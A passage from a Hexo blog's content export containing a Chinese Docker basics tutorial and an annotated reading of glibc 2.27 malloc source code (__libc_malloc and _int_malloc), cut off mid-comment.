<li><a href="https://www.cnblogs.com/reblue520/p/6239733.html" target="_blank" rel="noopener">nginx 403错误</a></li>
<li><a href="https://blog.csdn.net/qq_35843543/article/details/81561240" target="_blank" rel="noopener">nginx 403错误2</a></li>
<li><a href="https://www.cnblogs.com/shuo1208/p/6702531.html" target="_blank" rel="noopener">nginx重装等命令</a></li>
</ul>
]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>Butterfly</tag>
        <tag>hexo</tag>
        <tag>nginx</tag>
        <tag>git</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>docker基础</title>
    <url>/2020/02/16/docker%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="dockers基础"><a href="#dockers基础" class="headerlink" title="dockers基础"></a>dockers基础</h1><h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。</span><br><span class="line">程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。</span><br><span class="line">有了 Docker ，就不用担心环境问题。</span><br><span class="line">	这里文件就是指镜像</span><br><span class="line">	Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>

<h2 id="重要概念"><a href="#重要概念" class="headerlink" title="重要概念"></a>重要概念</h2><blockquote>
<p>docker是对容器进行操作的，镜像是产生容器的关键</p>
<p>在我的理解，docker主要是对镜像和容器进行一些操作</p>
</blockquote>
<h3 id="如何产生镜像"><a href="#如何产生镜像" class="headerlink" title="如何产生镜像"></a>如何产生镜像</h3><p>1.拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>

<ul>
<li>image_name就是指的镜像</li>
<li>pull就是拉取一个镜像</li>
</ul>
<blockquote>
<p>命令 docker pull 来下载的镜像都是docker 镜像仓库中存在的</p>
</blockquote>
<p>2.更新镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我们需要使用镜像来创建一个容器。</span><br><span class="line">对容器进行操作后</span><br><span class="line">使用 apt-get update 命令进行更新。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在完成操作之后，通过命令 <code>docker commit</code> 来提交容器副本</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker commit -m=&quot;something&quot; -a=&quot;zzl&quot; 容器ID image_name:tag</span><br><span class="line"></span><br><span class="line">各个参数说明：</span><br><span class="line"></span><br><span class="line">-m: 提交的描述信息</span><br><span class="line"></span><br><span class="line">-a: 指定镜像作者</span><br><span class="line"></span><br><span class="line">image_name:v1: 指定要创建的目标镜像名和标签</span><br></pre></td></tr></table></figure>

<p>3.构建镜像</p>
<blockquote>
<p> 我们使用命令 <strong>docker build</strong> 从零开始来创建一个新的镜像。</p>
<p>为此，我们需要创建一个 Dockerfile 文件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Dockerfile 一般分为四部分：基础镜像信息、维护者信息、镜像操作指令和容器启动时执行指令</span><br><span class="line">’#’ 为 Dockerfile 中的注释。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Docker以从上到下的顺序运行Dockerfile的指令。为了指定基本映像，第一条指令必须是<em>FROM</em>。一个声明以<code>＃</code>字符开头则被视为注释。可以在Docker文件中使用<code>RUN</code>，<code>CMD</code>，<code>FROM</code>，<code>EXPOSE</code>，<code>ENV</code>等指令。</p>
</blockquote>
<p>具体以后会了补充。。</p>
<h3 id="如何产生容器"><a href="#如何产生容器" class="headerlink" title="如何产生容器"></a>如何产生容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run 镜像名</span><br><span class="line">#docker run是利用镜像生成容器，并启动容器</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#一般可以加参数,否则只会生成一个容器的id</span><br><span class="line"></span><br><span class="line">如：docker run --name container-name -t -i -d ubuntu：1  /bin/bash</span><br><span class="line">--name：自定义容器名,可不加</span><br><span class="line">-i: 交互式操作。</span><br><span class="line">-t: 终端。</span><br><span class="line">-d：表示后台运行</span><br><span class="line">ubuntu:1: 这是指用 ubuntu 中tag为1的镜像为基础来启动容器。</span><br><span class="line">/bin/bash：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 /bin/bash。</span><br></pre></td></tr></table></figure>

<h2 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h2><h3 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images 查看镜像"></a>docker images 查看镜像</h3><pre><code>REPOSITORY：表示镜像的仓库源
TAG：镜像的标签
IMAGE ID：镜像ID
CREATED：镜像创建时间
SIZE：镜像大小</code></pre><h3 id="拖取镜像"><a href="#拖取镜像" class="headerlink" title="拖取镜像"></a>拖取镜像</h3><p>命令 <code>docker pull</code>来下载镜像。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>

<h3 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker rmi image_name</span><br></pre></td></tr></table></figure>

<h3 id="设置镜像标签"><a href="#设置镜像标签" class="headerlink" title="设置镜像标签"></a>设置镜像标签</h3><blockquote>
<p> 我们可以使用 docker tag 命令，为镜像添加一个新的标签。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker tag image_id image_name:tag</span><br><span class="line"></span><br><span class="line">#docker tag 镜像ID,用户名称、镜像源名(repository name)和新的标签名(tag)。</span><br><span class="line">#感觉像是新建了一个镜像</span><br></pre></td></tr></table></figure>

<h2 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h2><h3 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker ps		#查看运行的容器</span><br><span class="line">docker ps -a	#查看所有容器</span><br><span class="line">docker ps -l 	#查询最后一次创建的容器</span><br></pre></td></tr></table></figure>

<h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>以下命令使用 ubuntu 镜像启动一个容器，参数为以命令行模式进入该容器：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -it image_name /bin/bash</span><br><span class="line">#run有创建容器的功能</span><br><span class="line"></span><br><span class="line">docker start  &lt;容器 ID&gt;</span><br><span class="line">docker restart &lt;容器 ID&gt;</span><br><span class="line">#启动已停止运行的容器，id可以用docker ps -a查看</span><br></pre></td></tr></table></figure>

<h3 id="停止容器"><a href="#停止容器" class="headerlink" title="停止容器"></a>停止容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker stop &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exit 命令或者使用 CTRL+D 来退出容器</span><br></pre></td></tr></table></figure>

<h2 id="容器文件操作"><a href="#容器文件操作" class="headerlink" title="容器文件操作"></a>容器文件操作</h2><ul>
<li>容器内部操作</li>
</ul>
<p>先进docker容器内部</p>
<blockquote>
<p> z 把电脑上的文件导入到容器内部</p>
<p>sz 把容器内部的文件导出到电脑本地</p>
</blockquote>
<p>使用rz和sz命令，需安装lrzsz工具包，centos 系统用 yum</p>
<blockquote>
<p>yum install lrzsz</p>
</blockquote>
<p>ubuntu 系统用 apt-get</p>
<blockquote>
<p>apt-get install lrzsz</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用rz 把本地电脑文件传到docker 容器，</span><br><span class="line">输入rz 就会弹出文件选项框，选择文件上传</span><br><span class="line"></span><br><span class="line">把容器内部的文件导出到电脑本地用sz命令加上文件名称</span><br><span class="line">sz 文件名</span><br></pre></td></tr></table></figure>

<ul>
<li>容器外部操作</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">把宿主机上的文件复制到docker容器内部</span><br><span class="line"></span><br><span class="line"> docker cp /path/filename 容器id或名称:/path/filename</span><br><span class="line"></span><br><span class="line">也可以把docker容器内部的文件复制到本地</span><br><span class="line"></span><br><span class="line"> docker cp 容器id或名称:/path/filename /path/filename</span><br></pre></td></tr></table></figure>

<h3 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h3><pre><code>docker run  -itd ubuntu：1  /bin/bash
#-d：表示后台运行,为了方便一般后台运行</code></pre><blockquote>
<p>进入后台运行的容器有两种方法</p>
</blockquote>
<p>1.<strong>docker attach</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker attach  &lt;容器 ID&gt;</span><br><span class="line"></span><br><span class="line">#如果exit从这个容器退出，会导致容器的停止。</span><br></pre></td></tr></table></figure>

<p>2.<strong>docker exec</strong>    (推荐，退出不会停止)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker exec -it  &lt;容器 ID&gt; /bin/bash</span><br><span class="line"></span><br><span class="line">#如果从这个容器退出，不会导致容器的停止</span><br></pre></td></tr></table></figure>

<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><p>删除容器使用 <strong>docker rm</strong> 命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker rm -f  &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure>

<h3 id="导出和导入容器"><a href="#导出和导入容器" class="headerlink" title="导出和导入容器"></a>导出和导入容器</h3><p><strong>导出容器</strong></p>
<p>如果要导出本地某个容器，可以使用 <strong>docker export</strong> 命令。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker export 容器ID  &gt; 导出的路径文件名</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line">docker export 1e560fca3906 &gt; ubuntu.tar</span><br><span class="line">导出容器 1e560fca3906 快照到本地文件 ubuntu.tar。</span><br></pre></td></tr></table></figure>

<p><strong>导入容器快照</strong></p>
<p>可以使用 docker import 从容器快照文件中再导入为镜像</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat 要导入的文件 | docker import - 导入的镜像和tag</span><br><span class="line"></span><br><span class="line">如</span><br><span class="line"> cat ubuntu.tar | docker import - ubuntu:v1</span><br><span class="line"> 将快照文件 ubuntu.tar 导入到镜像 ubuntu:v1</span><br></pre></td></tr></table></figure>

<p>也可以通过指定 URL 或者某个目录来导入，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ docker import http://example.com/exampleimage.tgz example/imagerepo</span><br></pre></td></tr></table></figure>

<h3 id="运行一个-web-应用"><a href="#运行一个-web-应用" class="headerlink" title="运行一个 web 应用"></a>运行一个 web 应用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d -P 镜像名 python app.py</span><br><span class="line"></span><br><span class="line"># docker容器中运行一个 Python Flask 应用来运行一个web应用</span><br></pre></td></tr></table></figure>

<p>参数说明:</p>
<ul>
<li><strong>-d:</strong>让容器在后台运行。</li>
<li><strong>-P:</strong>将容器内部使用的网络端口映射到我们使用的主机上。</li>
</ul>
<blockquote>
<p> docker ps 来查看我们正在运行的容器，多了端口信息。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORTS</span><br><span class="line">0.0.0.0:32769-&gt;5000/tcp</span><br><span class="line"></span><br><span class="line">#Docker 开放了 5000 端口（默认 Python Flask 端口）映射到主机端口 32769 上</span><br></pre></td></tr></table></figure>

<p>也可以通过 -p 参数来设置不一样的端口</p>
<ul>
<li><strong>-P：</strong>是容器内部端口<strong>随机</strong>映射到主机的高端口。(大写)</li>
<li><strong>-p：</strong>是容器内部端口绑定到<strong>指定</strong>的主机端口。（小写）</li>
</ul>
<p>如：docker run -d -p ip:5000:5000  镜像名  python app.py</p>
<p>ip默认 0.0.0.0</p>
<blockquote>
<p>容器端口的映射情况</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker port 容器id或名字</span><br></pre></td></tr></table></figure>

<h3 id="查看-WEB-应用程序日志"><a href="#查看-WEB-应用程序日志" class="headerlink" title="查看 WEB 应用程序日志"></a>查看 WEB 应用程序日志</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker logs [ID或者名字]</span><br></pre></td></tr></table></figure>

<h3 id="查看WEB应用程序容器的进程"><a href="#查看WEB应用程序容器的进程" class="headerlink" title="查看WEB应用程序容器的进程"></a>查看WEB应用程序容器的进程</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker top [ID或者名字] </span><br><span class="line"></span><br><span class="line">#可查看进程号，运行命令等</span><br></pre></td></tr></table></figure>

<h2 id="run和start的区别"><a href="#run和start的区别" class="headerlink" title="run和start的区别"></a>run和start的区别</h2><pre><code> docker中run和start的区别
docker run 后面指定的是一个镜像

而docker start指定的是一个容器

docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><h2 id="关于镜像tag"><a href="#关于镜像tag" class="headerlink" title="关于镜像tag"></a>关于镜像tag</h2><blockquote>
<p>在我的理解下，tag一般用来，对同一个镜像的不同版本进行标记</p>
<p>在对镜像操作中，一般都用到 image_name:tag</p>
<p>默认的tag一般为 <code>latest</code></p>
</blockquote>
<h3 id="杂笔记"><a href="#杂笔记" class="headerlink" title="杂笔记"></a>杂笔记</h3><p>#实例运行、运行交互式的容器</p>
<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
-t: 在新容器内指定一个伪终端或终端。
-i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">docker stop container-name/container-id	停止当前运行的指定容器</span><br><span class="line"></span><br><span class="line">启动	docker start container-name/container-id	启动容器</span><br><span class="line"></span><br><span class="line">删除	docker rm container-id	删除指定容器</span><br><span class="line"></span><br><span class="line">端口映射	-p 6379:6379</span><br><span class="line">如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis	</span><br><span class="line">-p:主机端口映射到容器内部的端口</span><br></pre></td></tr></table></figure>

<p>停止容器<br>​    docker stop </p>
<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
<p>后台启动容器</p>
<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
 -d 参数时，容器启动后会进入后台
 -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
 -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：

docker attach

docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。

例如
docker attach 4b6771050406
docker exec -it b26d4f3e2cac /bin/bash

删除容器使用 docker rm 命令：
docker rm -f 1e560fca3906</code></pre><p>ocker Hub 网站来搜索镜像</p>
<p>面是一段简单的Dockerfile的例子：</p>
<pre><code>FROM python:2.7
MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
COPY . /app
WORKDIR /app
RUN pip install -r requirements.txt
EXPOSE 5000
ENTRYPOINT [&quot;python&quot;]
CMD [&quot;app.py&quot;]
我们可以分析一下上面这个过程：

1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
2、显示维护者的信息
3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
4、指定工作路径为 /app
5、安装依赖包
6、暴露 5000 端口
7、启动 app
这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>malloc流程</title>
    <url>/2020/04/13/malloc%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<blockquote>
<p>以下源码均来自libc2.27版本</p>
</blockquote>
<h1 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h1><p>可以看出申请内存的工作进一步给到了<code>_int_malloc</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;		<span class="comment">//空指针，返回的malloc地址</span></span><br><span class="line"></span><br><span class="line">  			<span class="comment">//判断是否有自定义堆分配函数，即__malloc_hook是否为空</span></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))		<span class="comment">//如果不为空，则执行hook函数并返回。</span></span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果使用TCACHE，执行下面代码，这里先不讨论（tcache是libc2.26之后引进的一种新机制，类似于fastbin）</span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache</span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//到这里继续看</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)		 <span class="comment">//如果是单线程的，默认从main_arena申请内存</span></span><br><span class="line">    &#123;</span><br><span class="line">      victim = _int_malloc (&amp;main_arena, bytes);</span><br><span class="line">      <span class="comment">//assert()其作用是如果它的条件返回错误，则终止程序执行</span></span><br><span class="line">      <span class="comment">//这里要满足1.申请到内存 2.是mmap的内存 3.申请到的内存必须在其所分配的arena中</span></span><br><span class="line">      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">	      &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">      <span class="keyword">return</span> victim;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);		<span class="comment">// 获取或创建arena 并且会将arena 加锁(mutex 互斥锁)处理。</span></span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena before. </span></span><br><span class="line"><span class="comment">  只有当我们能够找到一个可用的 arena 时，才可以用另一个 arena 重试*/</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)		<span class="comment">//如果没有分配到内存，且有可用的arena</span></span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)					<span class="comment">//申请到了arena，在退出前需要解锁。</span></span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><blockquote>
<p> 这里是源码</p>
</blockquote>
<p>之后将源码拆分分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);		<span class="comment">//字节对齐，将申请字节大小转化为内部chunk大小</span></span><br><span class="line">    									<span class="comment">//nb就是转化为chunk的大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">    <span class="comment">//没有可用的 arena。用sysmalloc以从mmap获得chunk.</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))	</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//---------------------------------------------------</span></span><br><span class="line"><span class="comment">//---------------------------------------------------</span></span><br><span class="line"><span class="comment">//宏定义一个函数 REMOVE_FB  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line">	 <span class="comment">//如果*fd=victim,则*fd=victim-&gt;fd,返回victim，即*fd！=victim进行循环</span></span><br><span class="line"><span class="comment">//---------------------------------------------------</span></span><br><span class="line"><span class="comment">//---------------------------------------------------</span></span><br><span class="line">    <span class="comment">//如果nb(chunk)大小在fastbin范围</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check 